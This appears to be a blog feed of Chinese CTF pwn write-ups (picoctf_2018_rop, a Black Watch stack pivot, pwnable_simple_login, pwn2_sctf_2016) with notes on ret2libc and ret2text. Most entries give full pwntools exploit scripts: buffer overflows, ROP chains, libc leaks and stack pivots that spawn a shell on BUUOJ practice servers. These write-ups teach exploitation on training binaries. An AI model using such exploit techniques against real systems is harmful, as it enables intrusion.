payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/image-20210711133802398.png" alt="image-20210711133802398"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>picoctf_2018_rop</title>
    <url>/2021/07171096.html</url>
    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
<p>IDA打开</p>
<p>main函数，里面发现vuln函数</p>
<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
<p>win_function1函数</p>
<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
<p>win_function2函数</p>
<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><pre class="line-numbers language-none"><code class="language-none">需要注意点就是，有个判断 条件if ( win1 &amp;&amp; win2 &amp;&amp; a1 &#x3D;&#x3D; -559039827 )，需要控制win1、win2、a1
win1、win2可以通过调用对应的函数进行赋值，而a1是作为flag函数的参数，在栈上构造好数据即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>先对win1赋值，使win1=1</p>
<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">28400</span><span class="token punctuation">)</span>

win_function1 <span class="token operator">=</span> <span class="token number">0x080485CB</span>
win_function2 <span class="token operator">=</span> <span class="token number">0x080485D8</span>
flag <span class="token operator">=</span> <span class="token number">0x0804862B</span>

payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x1c</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function1<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function2<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xBAAAAAAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xDEADBAAD</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input> "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><pre class="line-numbers language-none"><code class="language-none">0xBAAAAAAD是-1163220307对应的16进制的补码作为win_function2函数的参数
0xDEADBAAD是-559039827对应的16进制的补码作为flag函数的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn1</title>
    <url>/2021/07156e47.html</url>
    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210715112542782.png" alt="image-20210715112542782"></p>
<p>IDA打开，查看main函数，看到vul_function()函数</p>
<p><img src="/img/image-20210715112703453.png" alt="image-20210715112703453"></p>
<p><img src="/img/image-20210715112745902.png" alt="image-20210715112745902"></p>
<pre class="line-numbers language-none"><code class="language-none">虽然buf在栈上但输入的长度仅仅能够覆盖ebp和返回地址，但s在bss段，而且输入的长度也够长，因此想到了栈迁移，覆盖vul_function返回地址，使其到bss段上执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到s在bss段中的位置是0x804A300</p>
<p><img src="/img/image-20210715113306340.png" alt="image-20210715113306340"></p>
<p>在bss段的s上需要调用system(“/bin/sh”)，但没有提供system和”/bin/sh”的地址，还需要写个ROP链，先泄露write函数的真实地址，再利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本,从而得到system和”/bin/sh”的地址。</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>注意:发现做题久了之后，libc版本的问题，如果虚拟机LibcSearcher每次搜出来的libc版本都不是想要的版本，其实有个libc-2.23就可以了，大部分题用2.23都可以跑出来，2.23yyds！</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
<span class="token comment">#coding=utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#</span>
<span class="token comment"># from LibcSearcher import *</span>

context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27426</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"spwn"</span><span class="token punctuation">)</span>

bss_s <span class="token operator">=</span> <span class="token number">0x0804A300</span>				<span class="token comment">#将fake栈迁移到bss中</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x08048511</span>			<span class="token comment">#栈迁移所需要的的地址</span>
write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>	<span class="token comment">#plt表可以调用write函数</span>
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>	<span class="token comment">#got表里有write函数的真实地址</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>	<span class="token comment">#控制函数执行流需要再次回到主函数</span>
<span class="token comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span>
payload <span class="token operator">=</span> <span class="token string">b"aaaa"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
<span class="token comment"># 上面将一些执行流程写入了bss段</span>
<span class="token comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span>
payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_s<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#接收泄露的地址</span>
<span class="token comment">#libc = LibcSearcher("write", write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token comment">#获取libc的基地址</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#通过获取到的libc的基地址和"/bin/sh"在libc中的地址可以得到"/bin/sh"在程序中的真实地址</span>
<span class="token comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span>
<span class="token comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system('/bin/sh')</span>
payload <span class="token operator">=</span> <span class="token string">b"aaaa"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_s<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable_simple_login</title>
    <url>/2022/01216b1b.html</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><p>小萌新斗胆做了一下buu上第六页的一道pwn题，<del>纯粹是为了冲分，就是卷（bushi</del></p>
<p>首先检查保护机制，32位文件，开NX，没有开PIE，那这个题目应该不会太难。</p>
<p><img src="/img/1643120143654.png" alt="1643120143654"></p>
<p>继续看IDA，main函数</p>
<p><img src="/img/1643120156660.png" alt="1643120156660"></p>
<p>这里的base64加密很新颖，以前的pwn题都没有见过，代码分析了一下，就是需要输入的s内容转base64编码，然后进行一个比较，正确的话才能进入到correct函数</p>
<p>而correct函数中有后门函数system(‘/bin/sh’)。那么这个地方就该是关键</p>
<p>于是继续找，找到auth函数里有了一个漏洞点</p>
<p><img src="/img/1643120168747.png" alt="1643120168747"></p>
<p>input最大12个字节，而v4只有8个字节，调试一下发现，覆盖的是主函数的ebp，经过调试发现控制ebp可以跳转到任意地址，那么跳转到哪呢，发现input是个固定地址,  input是我们输入的内容，依靠leave指令将执行system(“/bin/sh”)的地址赋给esp，最后ret指令将地址给eip，完成利用。</p>
<p><img src="/img/1643120181750.png" alt="1643120181750"></p>
<p><img src="/img/1643120196162.png" alt="1643120196162"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25390</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Authenticate : "</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804927F</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0811EB40</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后</p>
<p><img src="/img/1643120231450.png" alt="1643120231450"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn2_sctf_2016</title>
    <url>/2021/0706ab6e.html</url>
    <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
<p>尝试运行了一下</p>
<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
<p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
<p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
<p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
<p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
<p><img src="/img/image-20210627163859886.png" alt="image-20210627163859886"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
<p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
<p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>整数溢出</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How many bytes do you want me to read?'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>泄露libc</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How many bytes do you want me to read?'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
printf_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'printf'</span><span class="token punctuation">,</span>printf_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>算出system和’/bin/sh’的地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">offset<span class="token operator">=</span>printf_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'printf'</span><span class="token punctuation">)</span>
system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>覆盖返回地址，夺权</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How many bytes do you want me to read?'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from LibcSearcher import *</span>

r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25624</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn2_sctf_2016'</span><span class="token punctuation">)</span>

printf_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
printf_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
main<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How many bytes do you want me to read? '</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
printf_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#libc=LibcSearcher('printf',printf_addr)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>
offset<span class="token operator">=</span>printf_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
bin_sh<span class="token operator">=</span>offset<span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How many bytes do you want me to read? '</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libc</title>
    <url>/2021/06208e24.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p>
<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
<h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p>
<p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p>
<h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p>
<p>1.泄露 一个调用函数的 地址</p>
<p>2.获取 libc 版本</p>
<p>3.获取 system 地址与 /bin/sh 的地址</p>
<p>4.再次执行源程序</p>
<p>5.触发栈溢出执行 system(‘/bin/sh’)</p>
<p>shellcode结构：</p>
<p><img src="/img/shellcode.png"></p>
<p>正常堆栈布局：</p>
<p><img src="/img/1.png"></p>
<p>ret2libc执行system的堆栈布局：</p>
<p><img src="/img/2.png"></p>
<p>具体例题可以查看[OGeek2019]babyrop的writeup。</p>
<p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2text</title>
    <url>/2021/062043a9.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text),使EIP指向具有system(“/bin/sh”)的代码段。<br>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p>
<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
<p>IDA打开，F5查看main函数</p>
<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
<p>看见system函数</p>
<p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
<p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
